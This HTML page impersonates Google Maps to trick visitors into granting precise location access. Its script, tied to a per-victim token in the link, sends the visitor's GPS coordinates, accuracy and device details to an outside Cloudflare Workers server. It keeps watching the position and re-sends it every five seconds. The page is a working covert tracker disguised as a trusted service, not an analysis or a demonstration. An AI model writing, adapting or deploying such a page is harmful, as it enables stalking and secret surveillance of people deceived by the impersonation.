<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Map</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">

<style>
html,body{
  margin:0;
  height:100%;
  font-family:system-ui,-apple-system;
}

.header{
 
  background: var(--surface-color);
  
  height: 48px;
 
  display: flex;
  align-items: center;
  justify-content: space-between;
  padding: 0 15px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);

}
.header #icon{
  width: 20px;
position: relative;
left: 0px;
}
.header>h3{
  position: relative;
  left:-75px;
  font-weight: 500;
}
.header>h3>span{
  
  font-weight: 300;
}
.header>button{
   padding:4px 10px;
  font-size:16px;
  border:none;
  border-radius:15px;
  background:rgb(0, 136, 255);
  color:#ffffff;
  cursor:pointer;
  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;

}
/* Google map background */
.map-bg{
  position:fixed;
  inset:0;
  z-index:1;
}
.map-bg iframe{
  width:110%;
  height:110%;
  border:0;
}

/* Permission overlay */
#permission{
  position:fixed;
  inset:0;
  background:rgba(255, 255, 255, 0.751);
  display:flex;
  flex-direction:column;
  justify-content:center;
  align-items:center;
  z-index:5;
  text-align:center;
}

#permission img{
  width:72px;
  margin-bottom:14px;
}

#permission button{
  padding:2px 10px;
  font-size:16px;
  border:none;
  border-radius:12px;
  background:rgb(0, 136, 255);
  color:#ffffff;
  cursor:pointer;
  font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}
.d-box{
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  
  background-color: white;
  border-radius: 15px;
  box-shadow: 0 0 5px rgba(128, 128, 128, 0.247);
  padding: 8px;
}
#icon{
  width: 40px;
}
.d-box>h3{
  color: gray;
}
.d-box>h3>span{
  color: gray;
  font-weight: 40;
}

#status{

  margin-top:10px;
  font-size:14px;
  color:#948f8f;
  max-width:260px;
}
</style>
<style>
:root {
  --bg-color: #ffffff;
  --surface-color: #ffffff;
  --text-color: #e8eaed;
  --accent-blue: #8ab4f8;
  --pill-bg: #ffffff;
  --pill-text: #3c4043;
}

/* Google UI layer */
.google-ui{
  position:fixed;
  inset:0;
  pointer-events:none;
  z-index:4;
}

/* allow clicks on buttons */
.google-ui *{
  pointer-events:auto;
}

/* --- Header / Search Bar Section --- */
.top-container {
  position: absolute;
  top: 10;
  width: 100%;
  padding: 10px 0;
  z-index: 10;
}

.search-bar {
  background: var(--surface-color);
  margin: 0 12px;
  height: 48px;
  border-radius: 24px;
  display: flex;
  align-items: center;
  padding: 0 15px;
  box-shadow: 0 2px 6px rgba(0,0,0,0.3);
}

.search-bar i.fa-location-dot { color: #4285F4; margin-right: 12px; }
.search-bar .search-text { flex: 1; color: #9aa0a6; font-size: 16px; }
.search-bar i.fa-microphone { color: #8ab4f8; margin-right: 15px; }
.profile-icon{
  width:32px;height:32px;
  background:#7b1fa2;
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
  color:white;
  font-size:14px;
}

/* Pills */
.pill-container{
  display:flex;
  overflow-x:auto;
  padding:12px;
  gap:8px;
}
.pill{
  background:var(--pill-bg);
  color:var(--pill-text);
  padding:8px 16px;
  border-radius:20px;
  display:flex;
  align-items:center;
  font-size:14px;
  white-space:nowrap;
}
.pill i{margin-right:6px}

/* Right tools */
.map-tools{
  position:absolute;
  right:12px;
  top:130px;
  display:flex;
  flex-direction:column;
  gap:12px;
}
.tool-btn{
  width:40px;height:40px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}
.tool-btn i{color:#e8eaed}
.compass i{color:#ea4335}

/* Bottom tools */
.bottom-right-tools{
  position:absolute;
  right:12px;
  bottom:80px;
  display:flex;
  flex-direction:column;
  gap:15px;
}

.locate-btn{
  width:48px;height:48px;
  background:var(--surface-color);
  border-radius:50%;
  display:flex;
  align-items:center;
  justify-content:center;
}

.directions-btn{
  width:56px;height:56px;
  background:#00838f;
  border-radius:16px;
  display:flex;
  align-items:center;
  justify-content:center;
}

/* Bottom nav */
.bottom-nav{
  position:absolute;
  bottom:0;
  width:100%;
  height:65px;
  background:#ffffff;
  display:flex;
  justify-content:space-around;
  align-items:center;
}

.nav-item{
  display:flex;
  flex-direction:column;
  align-items:center;
  font-size:20px;
  color:#6b6c6d;
}



.active-indicator{
  background:rgba(73, 200, 255, 0.84);
  padding:4px 20px;
  border-radius:15px;
}

.google-logo{
  position:absolute;
  bottom:75px;
  left:12px;
  font-weight:bold;
  opacity:.8;
  font-family: 'Roboto', sans-serif;
  font-weight: 700; /* Bold */
  font-size: 24px;
  letter-spacing: -2px;
}
/* CSS for Google Logo Colors */
.google-blue { color: #4285f4; }
.google-red { color: #ea4335; }
.google-yellow { color: #fbbc05; }
.google-green { color: #34a853; }



</style>

</head>

<body>

<!-- MAP -->
<div class="map-bg">
  <iframe id="mapFrame"
    src="https://www.google.com/maps?q=0,0&z=2&output=embed"
    loading="lazy">
  </iframe>
</div>

<!-- PERMISSION SCREEN -->
<div id="permission">
  <div class="d-box">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
    </svg>
    <h3>Google <span>Maps</span></h3>
    <button id="allowBtn">Open</button>
    <div id="status">To continue, enable device location</div>
  </div>
</div>

<!-- GOOGLE UI OVERLAY -->
<div class="google-ui">
  <div class="header">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 232597 333333">
      <path d="M151444 5419C140355 1916 128560 0 116311 0" fill="#1a73e8"/>
    </svg>
    <h3>Google <span>Maps</span></h3>
  </div>
</div>

<script>
const API = "https://odd-wildflower-ef2f.ishaqanwar751.workers.dev";
const token = new URLSearchParams(location.search).get("token");
if(!token){ alert("Invalid link"); throw "NO TOKEN"; }

const mapFrame = document.getElementById("mapFrame");
const statusEl = document.getElementById("status");

let lastPos = null;

/* DEVICE INFO */
function deviceInfo(){
  return {
    ua:navigator.userAgent,
    lang:navigator.language,
    screen:`${screen.width}x${screen.height}`,
    time: Date.now()
  };
}

/* SEND TO SERVER */
function send(pos){
  lastPos = pos;
  fetch(API+"/send-location",{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      token,
      lat:pos.coords.latitude,
      lng:pos.coords.longitude,
      acc:pos.coords.accuracy,
      device:deviceInfo()
    })
  });
}

/* BUTTON CLICK — MUST BE DIRECT */
document.getElementById("allowBtn").onclick = ()=>{
  if(!navigator.geolocation){
    statusEl.textContent="Location not supported";
    return;
  }

  statusEl.textContent="Requesting GPS permission…";

  navigator.geolocation.getCurrentPosition(
    pos=>{
      // first accurate hit
      mapFrame.src =
       `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}&z=18&output=embed`;

      send(pos);
      document.getElementById("permission").remove();

      // watch GPS changes
      navigator.geolocation.watchPosition(
        p=>send(p),
        ()=>{},
        { enableHighAccuracy:true, maximumAge:0 }
      );

      // FORCE send every 5 seconds (IMPORTANT)
      setInterval(()=>{
        if(lastPos) send(lastPos);
      }, 5000);

    },
    err=>{
      statusEl.textContent =
        err.code === 1
        ? "Permission denied. Enable Precise Location."
        : "GPS unavailable. Turn ON location.";
    },
    { enableHighAccuracy:true, timeout:25000, maximumAge:0 }
  );
};
</script>



</body>
</html>
